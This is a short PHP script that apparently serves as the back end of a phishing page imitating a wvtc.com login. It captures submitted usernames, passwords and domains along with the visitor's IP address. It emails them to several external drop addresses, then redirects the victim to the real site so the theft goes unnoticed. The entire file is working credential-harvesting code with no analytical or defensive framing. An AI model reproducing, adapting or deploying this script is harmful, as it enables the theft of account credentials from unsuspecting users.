﻿   <?
$ip = getenv("REMOTE_ADDR");
$message  = "---------------+ wvtc.com +-----------connect---\n";
$message .= "username: ".$_POST['login_username']."\n";
$message .= "password: ".$_POST['secretkey']."\n";
$message .= "Domain: ".$_POST['domain']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By EMMA-----------------\n";
$send = "suretools21@hotmail.com,suretools21@yahoo.com,ssportbet007@yahoo.com,spamtools33@gmail.com,resultbox519@gmail.com";
$subject = "warwick.net";
$headers = "From: obinna<logs@www.wvtc.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location: https://wvtc.com/");
	  

?>